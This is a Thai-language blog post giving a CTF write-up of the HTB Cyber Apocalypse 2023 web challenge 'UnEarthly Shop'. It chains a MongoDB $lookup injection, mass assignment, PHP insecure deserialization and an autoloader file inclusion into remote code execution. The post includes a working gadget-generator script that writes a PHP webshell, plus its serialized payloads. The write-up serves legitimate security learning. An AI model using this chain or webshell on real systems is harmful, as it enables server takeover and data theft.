<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

<title>
  
     [Write-up] Cyber Apocalypse 2023 - UnEarthly Shop (hard) | 
    SUAM
  
</title><meta name="description" content="CTF write-up ข้อ UnEarthly Shop หมวดเว็บของงาน Cyber Apocalypse 2023"><meta name="author" content="bongtrop">

<link rel="apple-touch-icon" href="/apple-touch-icon.png" sizes="180x180">
<link rel="icon" href="/favicon-32x32.png " sizes="32x32" type="image/png">
<link rel="icon" href="/favicon-16x16.png" sizes="16x16" type="image/png">
<link rel="manifest" href="/manifest.json">
<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#0c344b">
<link rel="icon" href="/favicon.ico">


<script async src="https://www.googletagmanager.com/gtag/js?id=UA-173363806-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-173363806-1');
</script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.17.1/themes/prism.min.css">
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css" integrity="sha384-AfEj0r4/OFrOo5t7NnNe46zW/tFgW6x/bCJG8FqQCEo3+Aro6EYUG4+cU+KJWu/X" crossorigin="anonymous">
<link rel="stylesheet" href="/dist/main.min.css"><link rel="canonical" href="https://suam.wtf/posts/write-up-cyber-apocalypse-2023-unearthly-shop/"><meta property="og:title" content="[Write-up] Cyber Apocalypse 2023 - UnEarthly Shop (hard)" />
<meta property="og:description" content="CTF write-up ข้อ UnEarthly Shop หมวดเว็บของงาน Cyber Apocalypse 2023" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://suam.wtf/posts/write-up-cyber-apocalypse-2023-unearthly-shop/" /><meta property="og:image" content="https://suam.wtf/images/uploads/writeup_cyber_apocalypse_2023_unearthly_shop/banner.png" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-03-23T00:00:00+00:00" />
<meta property="article:modified_time" content="2023-03-23T00:00:00+00:00" />
<meta itemprop="name" content="[Write-up] Cyber Apocalypse 2023 - UnEarthly Shop (hard)">
<meta itemprop="description" content="CTF write-up ข้อ UnEarthly Shop หมวดเว็บของงาน Cyber Apocalypse 2023"><meta itemprop="datePublished" content="2023-03-23T00:00:00+00:00" />
<meta itemprop="dateModified" content="2023-03-23T00:00:00+00:00" />
<meta itemprop="wordCount" content="1101"><meta itemprop="image" content="https://suam.wtf/images/uploads/writeup_cyber_apocalypse_2023_unearthly_shop/banner.png">
<meta itemprop="keywords" content="" /><meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://suam.wtf/images/uploads/writeup_cyber_apocalypse_2023_unearthly_shop/banner.png"/>

<meta name="twitter:title" content="[Write-up] Cyber Apocalypse 2023 - UnEarthly Shop (hard)"/>
<meta name="twitter:description" content="CTF write-up ข้อ UnEarthly Shop หมวดเว็บของงาน Cyber Apocalypse 2023"/>

</head>
<body>
    
<nav class="navbar navbar-expand-md navbar-light bg-light fixed-top shadow-sm" id="navbar-main-menu">
    <div class="container">
        <a class="navbar-brand font-weight-bold" href="https://suam.wtf/">SUAM</a>
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#main-menu" aria-controls="main-menu" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>
        <div class="collapse navbar-collapse" id="main-menu">
            <ul class="navbar-nav ml-auto">
                
                    <li class="nav-item"><a class="nav-link" href="/">Home</a></li>
                
                    <li class="nav-item"><a class="nav-link" href="/about">About</a></li>
                
            
                <li class="nav-item">
                    <a href="https://webring.wonderful.software#suam.wtf" title="วงแหวนเว็บ" target="_blank" class="nav-link" rel="noopener">
                        <img src="/images/webring.black.svg" width="25px" height="25px" alt="วงแหวนเว็บ" />
                    </a>
                </li>
            </ul>
        </div>
    </div>
</nav>


    
<main class="content-page container pt-7 pb-5">
    
    <div class="row">
        <div class="col">
            <article>
                <div class="row justify-content-center">
                    <div class="col-lg-8">
                        <div class="meta text-muted mb-3">
                            <p class="created text-muted text-uppercase font-weight-bold mb-1">March 23, 2023</p>
                            <span class="mr-2"><i class="fas fa-book-open mr-2"></i>1101 words</span>
                            <span><i class="fas fa-clock mr-2"></i>6 mins read</span>
                        </div>

                        <h1>[Write-up] Cyber Apocalypse 2023 - UnEarthly Shop (hard)</h1>

                        <ul class="authors list-inline"><li class="list-inline-item mr-3">
                    <div class="media author"><a href="/authors/bongtrop/" class="mr-3">
                                    <picture>
                                        <source srcset="/authors/bongtrop/bongtrop_hu65f5a07b0445c5fedda84b3f6d0d2244_19133_64x0_resize_q75_box.jpg 1x, /authors/bongtrop/bongtrop_hu65f5a07b0445c5fedda84b3f6d0d2244_19133_128x0_resize_q100_box.jpg 2x, /authors/bongtrop/bongtrop_hu65f5a07b0445c5fedda84b3f6d0d2244_19133_192x0_resize_q100_box.jpg 3x">
                                        <img src="/authors/bongtrop/bongtrop_hu65f5a07b0445c5fedda84b3f6d0d2244_19133_64x0_resize_q75_box.jpg" class="rounded-circle" alt="bongtrop">
                                    </picture>
                                </a><div class="media-body">
                            <h5 class="name my-0"><a href="/authors/bongtrop/" class="small">bongtrop</a>
                            </h5><p class="social small text-muted">
                                    <a href="https://twitter.com/@bongtrop">@bongtrop</a>
                                </p></div>
                    </div>
                </li></ul>
                    </div>
                </div><div class="row justify-content-center">
                    <div class="col-lg-8">
                        <div class="content">
                            <p><img src="/images/uploads/writeup_cyber_apocalypse_2023_unearthly_shop/banner.png" alt="Cover"></p>
<p>HTB จัดงานแข่ง CTF Cyber Apocalypse 2023 และงานแข่งเป็นให้เข้าไปเล่นยาว ๆ เลยคือ 5 วัน ตั้งแต่วันที่ 18 Mar - 23 Mar ทำให้สามารถแบ่งเวลามาเล่นได้บ้างเวลาว่าง ๆ เลยลองกลับมาเล่นดูกับทีม <code>#C0FFEE</code> ที่ไม่ได้เข้าร่วมมานาน ผลคือโจทย์หลากหลายมากถ้าใครว่าง ๆ ลองเข้าไปหา write-up หรือลองเอาโจทย์มา deploy เล่นได้  โจทย์มีตั้งแต่ง่าย ๆ จนเบื่อ ไปถึงยากจนสนุกเลยครับ ผลคือได้อันดับที่ 92 มา ยังติดใน scoreboard 100 อันดับแรก</p>
<p><img src="/images/uploads/writeup_cyber_apocalypse_2023_unearthly_shop/ctf_result.png" alt="CTF Result"></p>
<p>write-up ในบทความนี้เป็นของข้อ UnEarthly Shop หมวดเว็บของงาน Cyber Apocalypse 2023 โดยโจทย์จะมีรายละเอียดดังนี้ (มี sorce code แถมมาให้ด้วยใครอยากลองเอาไป run และทดลอง solve เองได้นะครับ วิธีก็ง่าย ๆ เลยคือ execute <code>./build-docker.sh</code>)</p>
<p><img src="/images/uploads/writeup_cyber_apocalypse_2023_unearthly_shop/challenge_description.png" alt="Challenge Description"></p>
<p><a href="/files/writeup_cyber_apocalypse_2023_unearthly_shop/web_unearthly_shop.zip">Source Code</a></p>
<h2 id="review-source-code">Review Source Code</h2>
<p>ผมเริ่มแก้ไขโจทย์ข้อนี้โดยใช้วิธี review source code เพื่อหาช่องโหว่ซะเป็นส่วนใหญ่ ไม่ได้ทำการ fuzz จากหน้าเว็บ ดังนั้นผมจากอธิบายออกแนวเป็นการ analyze source code นะครับ มี source code แล้วจะ fuzz ให้เหนื่อยทำไม โดยเจอช่องโหว่ดังนี้ครับ</p>
<p>ปล. fronend app คือหน้าปกติ <code>/</code> ส่วน backend app คือหน้า admin <code>/admin/</code> สามารถดูได้จาก <code>nginx.conf</code></p>
<h3 id="1-nosql-injection">1. NoSQL Injection</h3>
<p>อันแรกที่เจอเลยคือช่องโหว่นี้ เพราะติดว่าจำเป็นจะต้องมี credential ของ admin ถึงจะเข้าใช้งานหน้า admin ได้ และกวาดผ่าน ๆ ตาเจอว่ามีช่องโหว่ ถัด ๆ ไปอยู่ที่หน้า admin ดังนั้นผมเลย focus ที่การ bypass admin login และเจอว่า admin credential ถูกเก็บอยู่ใน MongoDB ผมจึงเน้นในการอ่านข้อผิดพลาดของการเขียน query MongoDB ซะเป็นส่วนใหญ่ และเจอว่า function <code>products</code> ของ class <code>ShopController</code> ของ frontend app ที่ไฟล์ <code>challenge/frontend/controllers/ShopController.php</code> ได้ส่ง user input ที่เป็น object เข้าไป query ใน MongoDB ตรง ๆ ทำให้มีช่องโหว่ที่เราจะใช้ query aggregation operator ที่ชื่อว่า <code>$lookup</code> เข้าไปอ่าน <code>users</code> collection และ leak admin credential ออกมาได้ ดังนี่</p>
<p>File: challenge/frontend/controllers/ShopController.php:14-27</p>
<pre><code class="language-php">    public function products($router)
    {
        $json = file_get_contents('php://input');
        $query = json_decode($json, true);

        if (!$query)
        {
            $router-&gt;jsonify(['message' =&gt; 'Insufficient parameters!'], 400);
        }

        $products = $this-&gt;product-&gt;getProducts($query);

        $router-&gt;jsonify($products);
    }
</code></pre>
<p>File: challenge/frontend/models/ProductModel.php</p>
<pre><code class="language-php">&lt;?php
class ProductModel extends Model
{
    public function __construct()
    {
        parent::__construct();
    }

    public function getProducts($query)
    {
        return $this-&gt;database-&gt;query('products', $query);
    }
}
</code></pre>
<p>โดยใช้ช่องโหว่นี้ เราก็จะสามารถเข้าไปในหน้า admin หรือเข้าไปใช้ backend app ได้แล้ว</p>
<h3 id="2-insecure-deserialization">2. Insecure Deserialization</h3>
<p>ช่องโหว่นี้ตรงตัวเลยครับ คือตัว backend app มีการใช้งาน function <code>unserialize</code> ซึ้ง well-known อยู่แล้วว่าไม่ปลอดภัย ดัง ที่ source code ด้านล่างเลยครับ</p>
<p>File: challenge/backend/models/UserModel.php:1-10</p>
<pre><code class="language-php">&lt;?php
class UserModel extends Model
{
    public function __construct()
    {
        parent::__construct();
        $this-&gt;username = $_SESSION['username'] ?? '';
        $this-&gt;email    = $_SESSION['email'] ?? '';
        $this-&gt;access   = unserialize($_SESSION['access'] ?? '');
    }
</code></pre>
<p>ถ้าไปตามไล่อ่านดีดีตัว <code>$_SESSION['access']</code> จะถูก set มาจาก database ใน mongodb ซึ่งไม่ได้มีวิธีให้เราสามารถเข้าไป set ได้ตาม logic ของ application จึงทำให้ต้องใช้ช่องโหว่ถัดไปในการแก้ไข <code>user.access</code> ใน database</p>
<h3 id="3-mass-assignment">3. Mass Assignment</h3>
<p>ตัว backend app มี function ที่ใช้สำหรับ update user ใน database โดยตัว logic ของมันคือต้องการให้ update ได้แค่ username กับ password เท่านั้น แต่ข้อผิดพลาดคือ ตัว function ได้ส่ง object ที่ได้จาก user เข้าไป update ที่ MongoDB โดยตรง ดังนี้</p>
<p>File: challenge/backend/controllers/UserController.php:39-54</p>
<pre><code class="language-php">    public function update($router)
    {
        $json = file_get_contents('php://input');
        $data = json_decode($json, true);

        if (!$data['_id'] || !$data['username'] || !$data['password'])
        {
            $router-&gt;jsonify(['message' =&gt; 'Insufficient parameters!'], 400);
        }

        if ($this-&gt;user-&gt;updateUser($data)) {
            $router-&gt;jsonify(['message' =&gt; 'User updated successfully!']);
        }

        $router-&gt;jsonify(['message' =&gt; 'Something went wrong!', 'status' =&gt; 'danger'], 500);
    }
</code></pre>
<p>File: challenge/backend/models/UserModel.php:71-74</p>
<pre><code class="language-php">    public function updateUser($data)
    {
        return $this-&gt;database-&gt;update('users', $data['_id'], $data);
    }
</code></pre>
<p>ทำให้ตอนยิง API endpoint นี้เราสามารถส่ง access เราเข้ามาใน payload เพื่อแก้ไข field <code>access</code> ใน database ได้ ดังนั้นเมื่อรวมกับช่องโหว่ <code>Insecure Deserialization</code> แล้วเราอาจจะสามารถ take over control flow ของ application ได้ แต่ในการที่เราจะทำ malicious action เช่น arbitrary read/write file หรือ RCE จากการ deserialize เราจำเป็นจะต้องมี code ในส่วนที่เมื่อ deserialize แล้วจะ execute คำสั่งที่อันตราย แต่จากการตรวจสอบเบื่องต้นพบว่า ไม่มี gadget ที่สามารถทำเรื่องแบบนั้นใน backend app (เป็นความรู้เพิ่มเติม php ถ้า class ไหนมี function <code>__wakeup</code> หรือ <code>__destruct</code> ที่อันตรายถ้าเรา deserialize object ของ class นั้น เราจะสามารถทำอะไรแปลก ๆ ที่ server ได้ เราเรียก class นั้นว่า gadget)</p>
<p>แต่ไปพบ gadget ที่สามารถทำ arbitrary write file เขียนไฟล์เข้าไปในเครื่องที่ไหนก็ได้ บน frontend app คือ <code>GuzzleHttp\Cookie\FileCookieJar</code> (challenge/frontend/vendor/guzzlehttp/guzzle/src/Cookie/FileCookieJar.php) แต่เรามีช่องโหว่ที่โจมตีได้แค่ backend app ตัว class ที่สามารถเป็น gadget ได้ไม่สามารถนำข้ามมาใช้งานได้ เราเลยต้องมีอีกช่องโหว่หนึ่งที่จะไปแอบดึง gadget ดังกล่าวมาใช้</p>
<h3 id="4-local-file-inclusion-lfi">4. Local File Inclusion (LFI)</h3>
<p>ช่องโหว่นี้เนียนตามากหานานมาก ๆ และต้องใช้การ debug เขามาช่วยให้หาเจอ ผมจะขอข้ามขั้นตอนการหาไปนะครับ เพราะมันยาวจริง ๆ เดียวผมจะแปะตัว code ให้ก่อน แล้วจะอธิบายเป็น step ด้านล่าง</p>
<p>File: challenge/backend/index.php:1-22</p>
<pre><code class="language-php">&lt;?php

require __DIR__ . &quot;/vendor/autoload.php&quot;;

spl_autoload_register(function ($name) {
    if (preg_match('/Controller$/', $name)) {
        $name = &quot;controllers/${name}&quot;;
    } elseif (preg_match('/Model$/', $name)) {
        $name = &quot;models/${name}&quot;;
    } elseif (preg_match('/_/', $name)) {
        $name = preg_replace('/_/', '/', $name);
    }

    $filename = &quot;/${name}.php&quot;;

    if (file_exists($filename)) {
        require $filename;
    }
    elseif (file_exists(__DIR__ . $filename)) {
        require __DIR__ . $filename;
    }
});
</code></pre>
<p>เรารู้ ๆ กันอยู่แล้วว่า function <code>spl_autoload_register</code> เป็นการอนุญาติให้ user ทำ LFI ได้ by design คือเป็นการ LFI ด้วยความตั้งใจของผู้สร้าง app เอง ถ้าเขียนดีดี เราจะไม่ถือว่ามันเป็นช่องโหว่ สำหรับใครที่ไม่เข้าใจการทำงานของ function <code>spl_autoload_register</code> สามารถไปอ่านได้ที่ <a href="https://php.net/manual/en/function.spl-autoload-register.php">https://php.net/manual/en/function.spl-autoload-register.php</a> สรุปง่าย ๆ คือ function นี้จะถูกเรียกใช้เพื่อทำการ auto <code>include</code> หรือ <code>require</code> class จากไฟล์อื่นให้โดยที่เมื่อเราเขียน code php เยอะ ๆ เราประกาศ class ไว้หลาย ๆ ไฟล์มาก ๆ เราไม่จำเป็นต้องมา include มันทุกไฟล์เดียว function นี้มันจะ include ให้เราเอง ดังนั้นการทำ sandbox ที่ดีสำหรับ function นี้จึงเป็นเรื่องจำเป็นมาก ๆ อย่างในเคสนี้ ถ้ามองดีดีใน บรรทัดที่ 14 ได้มีการ set ตัวแปล <code>filename</code> ด้วย <code>/${name}.php</code> สำหรับ <code>/</code> ขึ้นต้น ใน php มันหมายถึง การที่เราไปเริ่มที่ root path ที่ file system ของ os เลย ทำให้ถ้าเราสามารถ manipulate <code>$name</code> ที่รับเข้ามาได้ รวมไปถึงมีการ replace จาก <code>_</code> เป็น <code>/</code> ให้ใจดีสุด ๆ เราเลยสามารถไป include file ที่ลงท้ายด้วย <code>.php</code> ที่ไหนก็ได้ในเครื่อง server ได้เลย เช่น ถ้าผมสร้าง object จาก class <code>www_frontend_vendor_autoload</code> (<code>$obj = new www_frontend_vendor_autoload();</code>) มันก็จะไป include file <code>/www/frontend/vendor/autoload.php</code> ให้เราได้เลย ถือเป็น LFI แล้ว</p>
<p>จากองประกอบทั้งหมด เมื่อเรามี primitive ดังต่อไปนี้คือ</p>
<ul>
<li>Arbitrary Write File</li>
<li>Local File Inclusion</li>
</ul>
<p>เราจึงสามารถสรุปได้ว่าเราสามารถทำ RCE เครื่อง server ได้แล้ว โดยการ write file <code>shell.php</code> ไว้ซักที่หนึ่ง จากนั้น LFI เข้าไปอ่านไฟล์นั้น ตัว LFI ก็จะไป execute ไฟล์ <code>shell.php</code> ที่เราเตรียมไว้ เป็นอันจบ</p>
<h2 id="รายละเอยดการโจมต">รายละเอียดการโจมตี</h2>
<h3 id="1-โจมตชองโหว-nosql-injection-เพอ-leak-credential-admin">1. โจมตีช่องโหว่ NoSQL Injection เพื่อ leak credential admin</h3>
<p>ขั้นตอนนี้ไม่ยากเลยใช้ burp ยิงแล้วเติม <code>$lookup</code> operator ไปในการดึง product ซะดังภาพ</p>
<p><img src="/images/uploads/writeup_cyber_apocalypse_2023_unearthly_shop/exploit_nosql_injection.png" alt="Exploit NoSQL Injection"></p>
<p>ก็แค่ใส่ operator ดังต่อไปนี้เข้าไปก็จะได้รหัส admin เข้าไปโจมตีและ</p>
<pre><code class="language-json">{
   &quot;$lookup&quot;: {
      &quot;from&quot;:&quot;users&quot;,
      &quot;localField&quot;:&quot;_id&quot;,
      &quot;foreignField&quot;:&quot;_id&quot;,
      &quot;as&quot;:&quot;yoyo&quot;
   }
}
</code></pre>
<h3 id="2-generate-serialized-object-เตรยมไวโจมตชองโหว-insecure-deserialization">2. generate serialized object เตรียมไว้โจมตีช่องโหว่ Insecure Deserialization</h3>
<p>ผมสร้างตัว generator ไว้</p>
<p>File: unearthly_shop_gadget_generator.php</p>
<pre><code class="language-php">&lt;?php

namespace GuzzleHttp\Cookie{
    class SetCookie
    {
        private static $defaults = [
            'Name'     =&gt; null,
            'Value'    =&gt; null,
            'Domain'   =&gt; null,
            'Path'     =&gt; '/',
            'Max-Age'  =&gt; null,
            'Expires'  =&gt; null,
            'Secure'   =&gt; false,
            'Discard'  =&gt; false,
            'HttpOnly' =&gt; false
        ];
        function __construct()
        {
            $this-&gt;data['Expires'] = '&lt;?php $_GET[0]($_GET[1]);?&gt;';
            $this-&gt;data['Discard'] = 0;
        }
    }

    class CookieJar{
        private $cookies = [];
        private $strictMode;
        function __construct()
        {
            $this-&gt;cookies[] = new SetCookie();
        }
    }

    class FileCookieJar extends CookieJar{
        private $filename;
        private $storeSessionCookies;
        function __construct()
        {
            parent::__construct();
            $this-&gt;filename = &quot;/var/lib/nginx/body/exploit.php&quot;;
            $this-&gt;storeSessionCookies = true;
        }
    }
}

namespace {
    class www_frontend_vendor_autoload {
    }
    class var_lib_nginx_body_exploit {
    }

    class Exploit {
        private $a;
        private $b;
        function __construct()
        {
            $this-&gt;a = new www_frontend_vendor_autoload();
            $this-&gt;b = new \GuzzleHttp\Cookie\FileCookieJar();
        }
    }

    function gen_payload($payload) {
        return json_encode(array('_id' =&gt; 1, 'username' =&gt; 'admin', 'password' =&gt; 'admin', 'access' =&gt; $payload));
    }

    $exploit = new Exploit();
    $obj1 = serialize($exploit);

    $trigger = new var_lib_nginx_body_exploit();
    $obj2 = serialize($trigger);

    echo &quot;Step 1:\n&quot;;
    echo gen_payload($obj1);
    echo &quot;\n&quot;;
    echo &quot;\n&quot;;
    echo &quot;Step 2:\n&quot;;
    echo gen_payload($obj2);
}
</code></pre>
<p>โดยตัว generator นี้เมื่อ run จะได้มา 2 gadget คือ</p>
<ol>
<li>
<p>อันแรกจะเป็น class <code>Exploit</code> โดยจะมี sub object สองตัวคือ <code>www_frontend_vendor_autoload</code> และ <code>FileCookieJar</code> ตัวแรกจะใช้ LFI ไปโหลด gadget จาก frontend app มา อันที่สองจะเป็น gadget สำหรับเขียนไฟล์ไปที่ <code>/var/lib/nginx/body/exploit.php</code> โดยมีเนื่อหาไฟล์คือ <code>&lt;?php $_GET[0]($_GET[1]);?&gt;</code></p>
</li>
<li>
<p>อันที่สองจะเป็นการแค่ไป LFI ไฟล์ที่เขียนไว้คือ <code>/var/lib/nginx/body/exploit.php</code> โดย init class <code>var_lib_nginx_body_exploit</code> ได้ดังนี้</p>
</li>
</ol>
<pre><code>bongtrop@Pongsakorns-MacBook-Air:/tmp/ $ php unearthly_shop_gadget_generator.php
PHP Deprecated:  Creation of dynamic property GuzzleHttp\Cookie\SetCookie::$data is deprecated in /private/tmp/unearthly_shop_gadget_generator.php on line 19

Deprecated: Creation of dynamic property GuzzleHttp\Cookie\SetCookie::$data is deprecated in /private/tmp/unearthly_shop_gadget_generator.php on line 19
Step 1:
{&quot;_id&quot;:1,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;,&quot;access&quot;:&quot;O:7:\&quot;Exploit\&quot;:2:{s:10:\&quot;\u0000Exploit\u0000a\&quot;;O:28:\&quot;www_frontend_vendor_autoload\&quot;:0:{}s:10:\&quot;\u0000Exploit\u0000b\&quot;;O:31:\&quot;GuzzleHttp\\Cookie\\FileCookieJar\&quot;:4:{s:36:\&quot;\u0000GuzzleHttp\\Cookie\\CookieJar\u0000cookies\&quot;;a:1:{i:0;O:27:\&quot;GuzzleHttp\\Cookie\\SetCookie\&quot;:1:{s:4:\&quot;data\&quot;;a:2:{s:7:\&quot;Expires\&quot;;s:27:\&quot;&lt;?php $_GET[0]($_GET[1]);?&gt;\&quot;;s:7:\&quot;Discard\&quot;;i:0;}}}s:39:\&quot;\u0000GuzzleHttp\\Cookie\\CookieJar\u0000strictMode\&quot;;N;s:41:\&quot;\u0000GuzzleHttp\\Cookie\\FileCookieJar\u0000filename\&quot;;s:31:\&quot;\/var\/lib\/nginx\/body\/exploit.php\&quot;;s:52:\&quot;\u0000GuzzleHttp\\Cookie\\FileCookieJar\u0000storeSessionCookies\&quot;;b:1;}}&quot;}

Step 2:
{&quot;_id&quot;:1,&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&quot;admin&quot;,&quot;access&quot;:&quot;O:26:\&quot;var_lib_nginx_body_exploit\&quot;:0:{}&quot;}
</code></pre>
<h3 id="3-โจมต-mass-assignment-และ-re-login-สำหรบ-gadget-step-1">3. โจมตี Mass Assignment และ re-login สำหรับ gadget step 1</h3>
<p>โจมตี Mass Assignment เพื่อเปลี่ยน <code>access</code> ของ user admin ให้เป็น payload step 1 ดังภาพ</p>
<p><img src="/images/uploads/writeup_cyber_apocalypse_2023_unearthly_shop/exploit_mass_assignment_step_1.png" alt="Exploit Mass Assignment Step 1"></p>
<p>ทำการ login เข้าหน้า admin dashboard ใหม่อีกครั้งเพื่อ trigger function <code>unserialize</code> จะได้ error 500 unserialize มาไม่เจอ object อย่างที่หวัง แต่ gadget เราทำงานไปแล้ว</p>
<h3 id="4-โจทต-mass-assignment-และ-re-login-สำหรบ-gadget-step-2">4. โจทตี Mass Assignment และ re-login สำหรับ gadget step 2</h3>
<p>โจมตี Mass Assignment อีกครั้งเพื่อเปลี่ยน <code>access</code> เป็น payload step 2 ดังภาพ</p>
<p><img src="/images/uploads/writeup_cyber_apocalypse_2023_unearthly_shop/exploit_mass_assignment_step_2.png" alt="Exploit Mass Assignment Step 1"></p>
<p>ทำการ login ใหม่อีกครั้งและก็จะได้ shell แล้ว ไปอ่าน flag ได้เลย โดยการ execute <code>/readflag</code> ดังภาพ</p>
<p><img src="/images/uploads/writeup_cyber_apocalypse_2023_unearthly_shop/rce_readflag.png" alt="RCE Readflag"></p>
<h2 id="สรป">สรุป</h2>
<p>ประทับใจโจทย์ข้อนี้ที่สุดแล้ว และ CTF นี้แจก source code แทบทุกข้อเลย ทำให้ไม่ต้องการสกิลการเดาได ๆ ทั้งสิ้ง ทำให้ผมเล่นแล้วสนุกกับมันมาก (เป็นคนไม่ชอบ fuzz) ได้ฝึกการ skill secure code review ไปในตัว อีกกลับมาฝึกการ hack อีกครั้งหลังจากหยุดไปนาน สำหรับใครสนใจจะไปลองเล่นดู งานแข่งจบไปแล้วแต่ HTB เปิด after party event ให้ไปลองเล่นนะครับ ลิ้งนี้เลย <a href="https://ctf.hackthebox.com/event/details/cyber-apocalypse-2023-the-cursed-mission-after-party-937">https://ctf.hackthebox.com/event/details/cyber-apocalypse-2023-the-cursed-mission-after-party-937</a></p>

                        </div>
                    </div>
                </div>

                <div class="row justify-content-center">
                    <div class="col-lg-8">
                        
                    </div>
                </div></article>
        </div>
    </div>

    
</main>


    <footer class="footer text-center bg-dark py-2">
    <div class="container">
        <div class="row">
            <div class="col">
                <ul class="list-inline">
                    
                </ul>

                <p class="text-muted">
                    
                        Copyright &copy; SUAM 2023
                    
                </p>

                <p class="text-muted">
                Powered by <a href="https://gohugo.io" target="_blank">Hugo</a> with <a href="https://github.com/puresyntax71/hugo-theme-chunky-poster" target="_blank">Chunky Poster</a>.
                </p>
            </div>
        </div>
    </div>
</footer>

    
    
        
            <script src="/dist/app.js"></script>
        
    
        
            <script src="/dist/lazyload.js"></script>
        
    
        
            <script src="/dist/main.js"></script>
        
    
        
            <script src="/dist/vendors~app.js"></script>
        
    
        
            <script src="/dist/vendors~app~bootstrap.js"></script>
        
    
        
            <script src="/dist/vendors~bootstrap.js"></script>
        
    
        
            <script src="/dist/vendors~ekkoLightbox.js"></script>
        
    



<script>
    window.Prism = window.Prism || {};
    window.Prism.manual = true;
</script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.17.1/components/prism-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.17.1/plugins/autoloader/prism-autoloader.min.js"></script>



<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.js" integrity="sha384-g7c+Jr9ZivxKLnZTDUhnkOnsh30B4H0rpLUpJ4jAIKs4fnJI+sEnkvrMWph2EDg4" crossorigin="anonymous"></script>
<script defer src="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/contrib/auto-render.min.js" integrity="sha384-mll67QQFJfxn0IYznZYonOWZ644AWYC+Pt2cHqMaRhXVrursRwvLnLaebdGIlYNa" crossorigin="anonymous"></script>
<script>
document.body.onload = () => {
    renderMathInElement(document.body, {
        delimiters: [
            {left: "$$", right: "$$", display: true},
            {left: "\\[", right: "\\]", display: true},
            {left: "$", right: "$", display: false},
            {left: "\\(", right: "\\)", display: false}
        ]
    });
};
</script>






    
</body>
</html>
